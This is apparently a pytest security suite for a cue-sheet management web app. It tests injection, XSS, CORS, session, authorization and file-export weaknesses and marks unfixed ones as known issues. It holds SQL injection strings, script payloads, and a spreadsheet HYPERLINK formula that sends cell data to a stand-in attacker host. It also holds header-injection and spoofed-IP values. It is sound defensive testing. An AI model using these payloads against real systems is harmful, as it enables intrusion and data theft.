"""Attacks tried against the running app. Each test states the safe behaviour. `known_issue` ones are not safe yet."""
from datetime import datetime, timezone
from io import BytesIO

import pytest
from openpyxl import load_workbook
from sqlalchemy import inspect as sa_inspect

from app.core.config import settings
from app.main import app as fastapi_app
from conftest import PASSWORD, new_client


def login_raw(c, email, password=PASSWORD):
    return c.post("/api/auth/login", data={"username": email, "password": password})


# ── Injection ───────────────────────────────────────────────────────────────
SQLI = ["' OR '1'='1", "'; DROP TABLE users; --", "1) UNION SELECT hashed_password FROM users --", "%' OR 1=1 --"]


@pytest.mark.parametrize("payload", SQLI)
@pytest.mark.parametrize("path,param", [("/api/library/songs", "q"), ("/api/library/contributors", "q"), ("/api/projects/search/bg-composer", "q"),
                                        ("/api/delegations/projects/suggest", "q"), ("/api/library/members", "q"), ("/api/library/contributors/lookup", "name")])
def test_sql_injection_in_search_does_nothing(make, login, sync_engine, path, param, payload):
    admin = make.user("admin")
    res = login(admin).get(path, params={param: payload})
    assert res.status_code < 500, res.text
    assert "$2b$" not in res.text
    assert "users" in sa_inspect(sync_engine).get_table_names()


@pytest.mark.parametrize("payload", SQLI)
def test_sql_injection_at_login_fails(anon, make, payload):
    make.user("admin", email="admin@example.test")
    assert login_raw(anon, payload, payload).status_code == 401
    assert login_raw(anon, "admin@example.test", payload).status_code == 401


def test_stored_script_comes_back_as_json_never_html(make, login):
    c = login(make.user("admin"))
    title = "<script>alert(document.cookie)</script>"
    res = c.post("/api/projects/", json={"title": title, "type": "SERIAL"})
    assert res.status_code == 200 and res.headers["content-type"].startswith("application/json")
    assert c.get(f"/api/projects/{res.json()['id']}").headers["content-type"].startswith("application/json")


def test_oauth_error_page_escapes_what_google_sends_back(anon, make):
    from datetime import timedelta
    from app.services import gmail
    admin = make.user("admin")
    client = make.client(email="c@gmail.com")
    state = gmail.make_state(admin.id, client.id)
    res = anon.get("/api/mail/oauth/callback", params={"state": state, "error": "<script>alert(1)</script>"})
    assert "<script>alert(1)</script>" not in res.text


# ── Headers, CORS, errors ───────────────────────────────────────────────────
@pytest.mark.parametrize("header,value", [("x-content-type-options", "nosniff"), ("x-frame-options", "DENY"), ("referrer-policy", "strict-origin-when-cross-origin")])
def test_security_headers(anon, header, value):
    assert anon.get("/health").headers[header] == value


def test_hsts_in_production(anon, monkeypatch):
    monkeypatch.setattr(settings, "APP_ENV", "production")
    assert "max-age" in anon.get("/health").headers["strict-transport-security"]


def test_unknown_origin_gets_no_cors_permission(anon):
    res = anon.get("/health", headers={"Origin": "https://evil.example"})
    assert "access-control-allow-origin" not in res.headers


def test_allowed_origin_gets_cors(anon):
    res = anon.get("/health", headers={"Origin": "https://app.example.test"})
    assert res.headers["access-control-allow-origin"] == "https://app.example.test"


@pytest.mark.known_issue
@pytest.mark.xfail(strict=True, reason="SEC-L1: cors_safety_net trusts any http://localhost origin in production too")
def test_localhost_gets_no_cors_permission_in_production(anon, monkeypatch):
    monkeypatch.setattr(settings, "APP_ENV", "production")
    res = anon.get("/health", headers={"Origin": "http://localhost:9999"})
    assert "access-control-allow-origin" not in res.headers


def test_server_errors_do_not_leak_details(make, login):
    """A foreign key failure must not expose SQL to the client."""
    res = login(make.user("admin")).post("/api/episodes/project/999999", json={"episode_number": 1})
    assert "psycopg" not in res.text and "asyncpg" not in res.text and "INSERT" not in res.text


@pytest.mark.known_issue
@pytest.mark.xfail(strict=True, reason="BUG: an episode for a project that doesn't exist answers 500 instead of 404")
def test_episode_for_missing_project_is_404(make, login):
    assert login(make.user("admin")).post("/api/episodes/project/999999", json={"episode_number": 1}).status_code == 404


@pytest.mark.known_issue
@pytest.mark.xfail(strict=True, reason="SEC-L2: /docs and /openapi.json publish the whole API map in production")
def test_api_docs_are_off_in_production():
    assert fastapi_app.docs_url is None and fastapi_app.openapi_url is None


# ── Sessions ────────────────────────────────────────────────────────────────
@pytest.mark.known_issue
@pytest.mark.xfail(strict=True, reason="SEC-M1: the refresh cookie's path hides it from /logout, so it stays valid for 7 days after sign-out")
def test_logout_revokes_the_refresh_token(make, login, base_client):
    c = login(make.user("editor"))
    refresh = c.cookies.get("refresh_token")
    c.post("/api/auth/logout")
    assert new_client(base_client).post("/api/auth/refresh", cookies={"refresh_token": refresh}).status_code == 401


@pytest.mark.known_issue
@pytest.mark.xfail(strict=True, reason="SEC-M2: changing the password leaves other sessions signed in")
def test_password_change_ends_other_sessions(make, login):
    u = make.user("editor")
    stolen = login(u)
    assert login(u).post("/api/auth/change-password", json={"current_password": PASSWORD, "new_password": "Newer@123", "confirm_password": "Newer@123"}).status_code == 200
    assert stolen.get("/api/auth/me").status_code == 401


@pytest.mark.known_issue
@pytest.mark.xfail(strict=True, reason="SEC-M3: a used refresh token keeps working (no rotation), so a stolen one is never detected")
def test_refresh_token_works_only_once(make, base_client):
    from app.core.security import create_refresh_token
    t = create_refresh_token(str(make.user("editor").id))
    assert new_client(base_client).post("/api/auth/refresh", cookies={"refresh_token": t}).status_code == 200
    assert new_client(base_client).post("/api/auth/refresh", cookies={"refresh_token": t}).status_code == 401


def test_deactivated_user_cannot_refresh(make, db, base_client):
    from app.core.security import create_refresh_token
    u = make.user("editor", is_active=False)
    t = create_refresh_token(str(u.id))
    assert new_client(base_client).post("/api/auth/refresh", cookies={"refresh_token": t}).status_code == 401


@pytest.mark.known_issue
@pytest.mark.xfail(strict=True, reason="SEC-M4: login JSON hands out tokens the frontend keeps in localStorage, readable by any script (XSS)")
def test_login_does_not_put_tokens_in_the_response_body(anon, make):
    body = login_raw(anon, make.user("editor").email).json()
    assert "access_token" not in body and "refresh_token" not in body


# ── Login abuse ─────────────────────────────────────────────────────────────
@pytest.mark.known_issue
@pytest.mark.xfail(strict=True, reason="SEC-M5: lockout is per account, so anyone can lock a known user out for 15 minutes")
def test_stranger_cannot_lock_out_a_user(anon, make, base_client):
    from app.services.login_tracker import _MAX_ATTEMPTS
    victim = make.user("admin")
    for _ in range(_MAX_ATTEMPTS):
        login_raw(new_client(base_client), victim.email, "Wrong@123")
    assert login_raw(anon, victim.email).status_code == 200


@pytest.mark.known_issue
@pytest.mark.xfail(strict=True, reason="SEC-M6: no per-IP limit: one attacker can try one password against every account without ever locking")
def test_password_spraying_gets_throttled(anon, make):
    users = [make.user("editor") for _ in range(30)]
    codes = {login_raw(anon, u.email, "Wrong@123").status_code for u in users}
    assert 429 in codes


@pytest.mark.known_issue
@pytest.mark.xfail(strict=True, reason="SEC-L3: minimum password length is 6")
def test_short_passwords_are_refused():
    from app.schemas.auth import check_password_strength
    with pytest.raises(ValueError):
        check_password_strength("Ab@123")


@pytest.mark.known_issue
@pytest.mark.xfail(strict=True, reason="SEC-L4: the login history trusts X-Forwarded-For, so an attacker can write any IP into it")
def test_spoofed_ip_does_not_reach_login_history(anon, make, db):
    from app.models import AuditLog
    u = make.user("editor")
    anon.post("/api/auth/login", data={"username": u.email, "password": PASSWORD}, headers={"X-Forwarded-For": "6.6.6.6"})
    assert "6.6.6.6" not in db.query(AuditLog).filter_by(action="login").one().details


# ── Who may change what ─────────────────────────────────────────────────────
@pytest.fixture
def shop(make, login):
    wd = make.user("work_delegator")
    owner, stranger = make.user("editor"), make.user("editor")
    project = make.project(owner=wd)
    make.delegation(project, owner, wd, episode_range="1-5")
    ep = make.episode(project, 1, "pending")
    cue = make.cue(ep)
    return dict(owner=owner, stranger=stranger, project=project, ep=ep, cue=cue, sc=login(stranger), oc=login(owner))


CUE = {"song_title": "Hacked", "usage_type": "bi", "duration_sec": 1, "contributors": []}


@pytest.mark.known_issue
@pytest.mark.xfail(strict=True, reason="SEC-H1: any editor can delete any episode, including ones not allotted to them, with no audit entry")
def test_editor_cannot_delete_an_episode_of_someone_elses_work(shop):
    assert shop["sc"].delete(f"/api/episodes/{shop['ep'].id}").status_code == 403


@pytest.mark.known_issue
@pytest.mark.xfail(strict=True, reason="SEC-H1: any editor can overwrite cues of work not allotted to them")
def test_editor_cannot_edit_cues_of_someone_elses_work(shop):
    assert shop["sc"].put(f"/api/cues/{shop['cue'].id}", json=CUE).status_code == 403


@pytest.mark.known_issue
@pytest.mark.xfail(strict=True, reason="SEC-H1: any editor can rewrite any project's details")
def test_editor_cannot_edit_a_project_not_allotted_to_them(shop):
    assert shop["sc"].put(f"/api/projects/{shop['project'].id}", json={"title": "Hacked", "type": "SERIAL"}).status_code == 403


@pytest.mark.known_issue
@pytest.mark.xfail(strict=True, reason="SEC-H1: deleting an episode writes no audit entry, so it can't be traced")
def test_deleting_an_episode_is_audited(make, login, db):
    from app.models import AuditLog
    admin = make.user("admin")
    ep = make.episode(make.project(owner=admin))
    assert login(admin).delete(f"/api/episodes/{ep.id}").status_code == 200
    assert db.query(AuditLog).filter_by(action="delete", entity_id=ep.id).count() == 1


@pytest.mark.known_issue
@pytest.mark.xfail(strict=True, reason="SEC-H2: an approved cue sheet can still be edited, so what gets sent to societies may not be what the reviewer approved")
def test_approved_cue_sheet_is_locked(make, login):
    editor = make.user("editor")
    ep = make.episode(make.project(owner=editor), 1, "approved")
    cue = make.cue(ep)
    assert login(editor).put(f"/api/cues/{cue.id}", json=CUE).status_code in (403, 409)


@pytest.mark.known_issue
@pytest.mark.xfail(strict=True, reason="SEC-H2: an episode can be re-submitted after approval, resetting the approval")
def test_approved_episode_cannot_be_resubmitted(make, login):
    editor = make.user("editor")
    ep = make.episode(make.project(owner=editor), 1, "approved")
    assert login(editor).post(f"/api/episodes/{ep.id}/submit").status_code in (403, 409)


@pytest.mark.known_issue
@pytest.mark.xfail(strict=True, reason="SEC-M7: a pending episode can be approved without ever being submitted")
def test_only_submitted_episodes_can_be_approved(make, login):
    admin = make.user("admin")
    ep = make.episode(make.project(owner=admin), 1, "pending")
    assert login(admin).post(f"/api/episodes/{ep.id}/approve").status_code in (400, 409)


@pytest.mark.known_issue
@pytest.mark.xfail(strict=True, reason="SEC-M8: a viewer can download every cue sheet")
def test_viewer_cannot_export(make, login):
    admin = make.user("admin")
    ep = make.episode(make.project(owner=admin))
    make.cue(ep)
    assert login(make.user("viewer")).get(f"/api/exports/episode/{ep.id}", params={"society": "iprs"}).status_code == 403


@pytest.mark.known_issue
@pytest.mark.xfail(strict=True, reason="SEC-M8: every signed-in user can read client emails and Gmail connection details")
def test_editor_cannot_read_client_mailbox_details(make, login):
    make.client(email="client@gmail.com")
    assert "client@gmail.com" not in login(make.user("editor")).get("/api/clients/").text


@pytest.mark.known_issue
@pytest.mark.xfail(strict=True, reason="SEC-M8: every signed-in user can read society emails, including BCC lists and message text")
def test_editor_cannot_read_society_email_details(make, login, db):
    from app.models.society_submission import SocietySubmission
    admin = make.user("admin")
    project = make.project(owner=admin)
    db.add(SocietySubmission(project_id=project.id, episode_from=1, episode_to=1, submitted_by=admin.id, sent_via="gmail", mail_status="sent", mail_bcc="secret@example.test"))
    db.commit()
    assert "secret@example.test" not in login(make.user("editor")).get("/api/society-submissions/").text


@pytest.mark.known_issue
@pytest.mark.xfail(strict=True, reason="SEC-M8: every signed-in user can read society addresses and templates")
def test_viewer_cannot_read_society_addresses(make, login):
    make.society("IPRS", to="private@iprs.org")
    assert "private@iprs.org" not in login(make.user("viewer")).get("/api/societies/").text


@pytest.mark.known_issue
@pytest.mark.xfail(strict=True, reason="SEC-L5: an editor can mark their own delegation completed, which removes it from the underperformance check")
def test_editor_cannot_clear_their_own_flag_by_marking_work_completed(make, login):
    wd, editor = make.user("work_delegator"), make.user("editor")
    d = make.delegation(make.project(owner=wd), editor, wd, episode_range="1-5")
    res = login(editor).put(f"/api/delegations/{d.id}", json={"status": "completed"})
    assert res.status_code == 403 or res.json()["status"] != "completed"


@pytest.mark.known_issue
@pytest.mark.xfail(strict=True, reason="BUG: delegation status isn't checked, so any text can be stored")
def test_delegation_status_must_be_a_known_value(make, login):
    wd, editor = make.user("work_delegator"), make.user("editor")
    d = make.delegation(make.project(owner=wd), editor, wd)
    assert login(editor).put(f"/api/delegations/{d.id}", json={"status": "<img src=x>"}).status_code in (400, 422)


# ── Files ───────────────────────────────────────────────────────────────────
@pytest.mark.known_issue
@pytest.mark.xfail(strict=True, reason="SEC-M9: text starting with = is written to exports as a live Excel formula, and these files go to societies")
def test_formula_in_a_song_title_is_not_a_formula_in_the_export(make, login):
    admin = make.user("admin")
    ep = make.episode(make.project(owner=admin))
    make.cue(ep, title='=HYPERLINK("http://evil.example/?x="&A1,"click")')
    res = login(admin).get(f"/api/exports/episode/{ep.id}", params={"society": "iprs"})
    assert res.status_code == 200
    cells = [c for ws in load_workbook(BytesIO(res.content)).worksheets for row in ws.iter_rows() for c in row]
    assert not [c.value for c in cells if c.data_type == "f" and "evil.example" in str(c.value)]


@pytest.mark.known_issue
@pytest.mark.xfail(strict=True, reason="BUG: a serial title in Hindi crashes the single-episode export (header isn't latin-1)")
def test_export_works_for_a_hindi_title(make, login):
    admin = make.user("admin")
    ep = make.episode(make.project("कोठा", owner=admin))
    make.cue(ep)
    assert login(admin).get(f"/api/exports/episode/{ep.id}", params={"society": "iprs"}).status_code == 200


@pytest.mark.known_issue
@pytest.mark.xfail(strict=True, reason="SEC-L6: the serial title goes unescaped into the download header, so a title can change the file name and type")
def test_quote_in_title_cannot_change_the_download_name(make, login):
    admin = make.user("admin")
    ep = make.episode(make.project('a"; filename="evil.exe', owner=admin))
    make.cue(ep)
    res = login(admin).get(f"/api/exports/episode/{ep.id}", params={"society": "iprs"})
    assert res.headers["content-disposition"].count("filename=") == 1


def test_large_declared_body_is_refused(make, login):
    c = login(make.user("admin"))
    res = c.post("/api/projects/", content=b"{}", headers={"Content-Length": str(settings.max_body_size_bytes + 1), "Content-Type": "application/json"})
    assert res.status_code == 413


@pytest.mark.known_issue
@pytest.mark.xfail(strict=True, reason="SEC-M10: the size limit only reads Content-Length, so a chunked upload skips it")
def test_chunked_body_over_the_limit_is_refused(make, login, monkeypatch):
    monkeypatch.setattr(settings, "MAX_BODY_SIZE_MB", 1)
    c = login(make.user("admin"))
    project = make.project()

    def chunks():
        yield b'--x\r\nContent-Disposition: form-data; name="file"; filename="a.xlsx"\r\nContent-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet\r\n\r\n'
        yield b"0" * (2 * 1024 * 1024)
        yield b"\r\n--x--\r\n"
    res = c.post(f"/api/uploads/rough/project/{project.id}/preview", content=chunks(), headers={"Content-Type": "multipart/form-data; boundary=x"})
    assert res.status_code == 413


def test_zip_bomb_style_excel_does_not_crash_the_server(make, login):
    """A valid zip that isn't a workbook: refused cleanly."""
    import zipfile
    buf = BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("xl/workbook.xml", "<workbook>" + "A" * 1000 + "</workbook>")
    admin = make.user("admin")
    res = login(admin).post(f"/api/uploads/rough/project/{make.project().id}/preview",
                            files={"file": ("a.xlsx", buf.getvalue(), "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")})
    assert res.status_code < 500, res.text


# ── Data checks ─────────────────────────────────────────────────────────────
@pytest.mark.known_issue
@pytest.mark.xfail(strict=True, reason="BUG: negative song durations are accepted and flow into the cue sheet")
def test_negative_duration_is_refused(make, login):
    admin = make.user("admin")
    ep = make.episode(make.project(owner=admin))
    assert login(admin).post(f"/api/cues/episode/{ep.id}", json={**CUE, "duration_sec": -5}).status_code == 422
